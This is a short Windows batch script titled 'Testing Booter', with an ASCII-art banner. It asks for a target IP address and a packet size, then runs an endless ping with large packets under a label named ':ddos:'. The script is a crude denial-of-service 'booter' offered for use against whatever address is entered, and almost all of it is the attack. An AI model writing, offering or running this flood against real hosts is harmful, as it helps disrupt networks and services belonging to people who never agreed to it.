@echo off
color 0b
title Testing Booter
cls


echo Test by 4po.

:greetings


echo  $$$$$$\  $$$$$$$\   $$$$$$\  
echo $$  __$$\ $$  __$$\ $$  __$$\ 
echo $$ /  $$ |$$ |  $$ |$$ /  $$ |
echo $$$$$$$$ |$$$$$$$  |$$ |  $$ |
echo $$  __$$ |$$  ____/ $$ |  $$ |
echo $$ |  $$ |$$ |      $$ |  $$ |
echo $$ |  $$ |$$ |       $$$$$$  |
echo \__|  \__|\__|       \______/ 

goto start

:start:

ping localhost >nul

@echo Insert the IP Adress. 
set /p x=ip adress:
goto packets
:packets:
set /p y=packets:
goto ddos

:ddos:
color 0b
ping %x% -t -l %y%
color 0b